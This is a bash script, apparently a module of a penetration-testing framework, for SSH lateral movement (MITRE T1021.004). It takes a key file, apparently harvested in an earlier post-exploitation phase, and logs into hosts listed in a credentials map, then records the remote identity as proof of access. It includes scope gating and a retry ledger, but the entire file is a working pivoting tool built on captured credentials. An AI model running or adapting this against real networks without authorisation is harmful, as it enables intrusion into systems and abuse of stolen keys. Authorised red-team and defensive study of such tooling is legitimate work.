#!/usr/bin/env bash
# ==============================================================================
# v0506_ssh_pivot.sh v2 — SSH lateral with MAP GATE (T1021.004)
# Consumed by exploit_runner.sh. Subcommands: validate | execute
#
# ELITE DOCTRINE, MECHANICAL:
#   1. MAP GATE: DEST must exist in credentials_map.json destinations[].
#      Unmapped destination => exit 2 (chain refused). Not a warning. An exit.
#   2. Verified-path preference: map entries with match:"local_key=..." are the
#      sanctioned hops (phase-08 fingerprint cross-reference).
#   3. BatchMode=yes + PasswordAuthentication=no + ConnectTimeout: no prompts,
#      no fallback, no hanging session.
#   4. Single attempt per invocation. Retry needs a NEW invocation.
#   5. Proof = remote identity (id/hostname) — evidence-grade, not narrative.
# ==============================================================================
set -uo pipefail
VECTOR_ID="V-05-KEY"
TECHNIQUE="T1021.004"
EVID_DIR="${EVID_DIR:-./lat_evidence}"
TS="${TS:-$(date -u +%Y%m%dT%H%M%SZ)}"
MAP="${MAP:-../08_post_exploitation/evidence/credentials_map.json}"
KEY_FILE="${KEY_FILE:-}"
DEST="${DEST:-}"           # user@host
JUSTIFY="${JUSTIFY:-}"     # retry justification file (only needed for retries)
STATE="${STATE:-${EVID_DIR}/attempted.list}"   # retry-ceiling ledger

map_contains() {  # map_contains <host> -> 0 if host has a destinations[] entry
  local host="$1"
  grep -qE "\"host\"\s*:\s*\"${host}\"" "${MAP}" 2>/dev/null
}

attempted_before() {
  [[ -f "${STATE}" ]] && grep -qxF "${DEST}" "${STATE}"
}

cmd="${1:-help}"
case "${cmd}" in
  validate)
    mkdir -p "${EVID_DIR}"
    local_err=0
    : > "${EVID_DIR}/validation.txt"
    [[ -s "${MAP}" ]] || { echo "map=missing_or_empty" >> "${EVID_DIR}/validation.txt"; exit 2; }
    # MAP GATE — the phase-08 contract, enforced
    if [[ -z "${DEST}" || "${DEST}" != *@* ]]; then
      echo "dest=invalid_format" >> "${EVID_DIR}/validation.txt"; local_err=1
    else
      dhost="${DEST#*@}"
      if ! map_contains "${dhost}"; then
        echo "dest=${dhost} in_map=NO -> REFUSED (chain: phase-08 contract)" \
          >> "${EVID_DIR}/validation.txt"
        exit 2
      fi
      echo "dest=${dhost} in_map=YES" >> "${EVID_DIR}/validation.txt"
    fi
    [[ -r "${KEY_FILE:-/nonexistent}" ]] || { echo "key=unreadable" >> "${EVID_DIR}/validation.txt"; local_err=1; }
    # retry ceiling: if attempted before, require justification artifact
    if attempted_before; then
      if [[ -z "${JUSTIFY}" || ! -s "${JUSTIFY}" ]]; then
        echo "retry=refused_no_justification" >> "${EVID_DIR}/validation.txt"
        exit 2
      fi
      echo "retry=justified(${JUSTIFY})" >> "${EVID_DIR}/validation.txt"
    fi
    (( local_err == 0 )) || exit 3
    echo "gate=passed" >> "${EVID_DIR}/validation.txt"
    exit 0
    ;;

  execute)
    mkdir -p "${EVID_DIR}"
    # re-run gate before firing (defense in depth: validate is not trusted)
    dhost="${DEST#*@}"
    map_contains "${dhost}" || { echo '{"outcome":"refused_unmapped","dest":"'"${dhost}"'"}' \
      > "${EVID_DIR}/outcome.json"; exit 2; }
    attempted_before && { echo '{"outcome":"refused_retry_no_justification"}' \
      > "${EVID_DIR}/outcome.json"; exit 2; }

    {
      echo "### lateral proof ts=${TS} vector=${VECTOR_ID}"
      echo "destination=${DEST} method=key BatchMode=yes ConnectTimeout=8"
      ssh -i "${KEY_FILE}" -o BatchMode=yes -o ConnectTimeout=8 \
          -o StrictHostKeyChecking=accept-new -o PasswordAuthentication=no \
          -o NumberOfPasswordPrompts=0 \
          "${DEST}" 'echo remote_identity:; id; hostname; ip -4 addr | grep inet | head -4' \
          2>&1
    } > "${EVID_DIR}/execution_proof.txt"

    echo "${DEST}" >> "${STATE}"   # attempt ledger (ceiling enforcement)
    if grep -q "remote_identity:" "${EVID_DIR}/execution_proof.txt" \
       && grep -q "^uid=" "${EVID_DIR}/execution_proof.txt"; then
      echo '{"outcome":"context_obtained","destination":"'"${DEST}"'","method":"ssh_key"}' \
        > "${EVID_DIR}/outcome.json"
      exit 0
    fi
    echo '{"outcome":"execution_failed","destination":"'"${DEST}"'"}' \
      > "${EVID_DIR}/outcome.json"
    exit 4
    ;;

  *) echo "usage: $0 validate|execute (env: MAP, KEY_FILE, DEST, JUSTIFY)" >&2; exit 2 ;;
esac
